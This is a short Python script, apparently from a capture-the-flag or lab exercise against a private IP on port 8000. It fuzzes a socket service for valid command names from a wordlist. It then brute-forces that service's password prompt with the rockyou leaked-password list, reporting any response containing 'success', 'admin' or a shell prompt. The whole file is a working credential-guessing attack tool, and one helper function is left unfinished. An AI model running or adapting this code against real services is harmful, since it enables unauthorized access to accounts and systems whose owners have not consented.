import socket

passwords_wordlist = "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
endpoints_wordlist = "/home/cccitron/Downloads/API_wordlist"
#hostname = input("Hostname (IP or hostname): ")
#port = int(input("Port: "))

hostname = "10.80.166.57"
port = 8000

# Use this if there's no set ammount of tries!
def limitless_fuzz_endpoints():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    with open(endpoints_wordlist, 'rb') as f:
        endpoints = f.read()

    for endpoint in endpoints.decode().splitlines():
        client_socket.sendall(endpoint.encode(errors="ignore"))
        response = client_socket.recv(1024).decode(errors="ignore")
        if not f"name '{endpoint}' is not defined" in response:
            print(f"Endpoint: '{endpoint}' worked! Response: {response}")
            user_choice = input(f"Brute force password with endpoint: '{endpoint}' (y/n): ")
            if user_choice.lower() == "y":
                limitless_brute_force(endpoint)
            elif user_choice.lower() == 'n':
                print("Bye!")
            else:
                print("Wrong input")

# Use this if there's no set ammount of tries!
def limitless_brute_force(endpoint):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))

    with open(passwords_wordlist, 'rb') as f:
        passwords =f.read()

    try:
        client_socket.sendall(endpoint.encode())
        response = client_socket.recv(1024).decode(errors="ignore")
        if 'password' in response.lower():
            for password in passwords.decode(errors="ignore").splitlines():
                client_socket.sendall(password.encode(errors="ignore"))
                response = client_socket.recv(1024).decode(errors="ignore")
                if any(word in response.lower() for word in ("success", "admin", "$")):
                    print(response)
                    print(f"Password is '{password}'")
    except (OSError, ConnectionError) as e:
        print(f"Connection error during brute-force: {e}")
    # ensure socket is closed if we exhausted the list or an error occurred
    try:
        client_socket.close()
    except Exception:
        pass
    return False

def limit_connect_endpoint():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((hostname, port))


        
def main():
    limitless_fuzz_endpoints()

if __name__ == "__main__":
    main()